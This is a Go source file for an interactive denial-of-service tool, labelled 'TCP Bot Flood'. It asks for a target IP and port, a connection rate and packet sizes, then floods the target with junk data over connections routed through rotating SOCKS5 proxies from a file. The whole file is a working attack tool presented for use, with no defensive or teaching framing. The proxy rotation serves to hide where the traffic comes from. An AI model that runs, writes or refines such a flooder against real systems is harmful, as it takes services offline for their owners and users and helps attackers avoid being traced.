package main

import (
	"bufio"
	"fmt"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
	"golang.org/x/net/proxy"
)

func askInput(prompt string, defaultVal string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%s (default: %s): ", prompt, defaultVal)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	if input == "" {
		return defaultVal
	}
	return input
}

func main() {
	fmt.Println("Select attack method:")
	fmt.Println("1) TCP Bot Flood (default)")
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter number: ")
	methodInput, _ := reader.ReadString('\n')
	methodInput = strings.TrimSpace(methodInput)
	method := "TCP Bot Flood"
	if methodInput != "" && methodInput != "1" {
		fmt.Println("Invalid input, defaulting to TCP Bot Flood")
	}

	fmt.Printf("Selected method: %s\n\n", method)

	target := askInput("Target IP", "127.0.0.1")
	InpPortStr := askInput("Target Port", "8443")
	InpConStr := askInput("Connections per second", "15000")
	InpTimeoutStr := askInput("Timeout (seconds)", "2")
	InpPacketS := askInput("Packet size (bytes)", "2469")
	InpPPS := askInput("Packets per connection", "1000")
	InpBots := askInput("Proxy file path", "working.txt")
	InpDuration := askInput("Attack duration (seconds, 0 for unlimited)", "0")

	port, _ := strconv.Atoi(InpPortStr)
	rps, _ := strconv.Atoi(InpConStr)
	timeoutSec, _ := strconv.Atoi(InpTimeoutStr)
	packetSize, _ := strconv.Atoi(InpPacketS)
	packetsPerConn, _ := strconv.Atoi(InpPPS)
	durationSec, _ := strconv.Atoi(InpDuration)
	timeout := time.Duration(timeoutSec) * time.Second

	addr := fmt.Sprintf("%s:%d", target, port)
	fmt.Printf("\nTarget: %s at %d connections/sec, %d bytes per packet, %d packets per connection.\nCtrl+C to stop.\n",
		addr, rps, packetSize, packetsPerConn)

	file, err := os.Open(InpBots)
	if err != nil {
		fmt.Printf("Failed to open proxy file: %v\n", err)
		return
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxies = append(proxies, line)
		}
	}
	if len(proxies) == 0 {
		fmt.Println("No proxies found. Exiting.")
		return
	}

	var success uint64
	var failure uint64
	payload := make([]byte, packetSize)

	ticker := time.NewTicker(time.Second / time.Duration(rps))
	defer ticker.Stop()
	statsTicker := time.NewTicker(1 * time.Second)
	defer statsTicker.Stop()

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)

	var durationStop <-chan time.Time
	if durationSec > 0 {
		durationStop = time.After(time.Duration(durationSec) * time.Second)
	}

	for {
		select {
		case <-stop:
			fmt.Println("\nStopped by user.")
			return
		case <-durationStop:
			fmt.Println("\nStopped after duration elapsed.")
			return
		case <-ticker.C:
			go func() {
				proxyAddr := proxies[time.Now().UnixNano()%int64(len(proxies))]
				dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
				if err != nil {
					atomic.AddUint64(&failure, 1)
					return
				}

				conn, err := dialer.Dial("tcp", addr)
				if err != nil {
					atomic.AddUint64(&failure, 1)
					return
				}
				defer conn.Close()
				conn.SetDeadline(time.Now().Add(timeout))

				for i := 0; i < packetsPerConn; i++ {
					_, err := conn.Write(payload)
					if err != nil {
						atomic.AddUint64(&failure, 1)
						return
					}
					atomic.AddUint64(&success, 1)
				}
			}()
		case <-statsTicker.C:
			s := atomic.SwapUint64(&success, 0)
			f := atomic.SwapUint64(&failure, 0)
			fmt.Printf("Success: %d, Failed: %d\n", s, f)
		}
	}
}
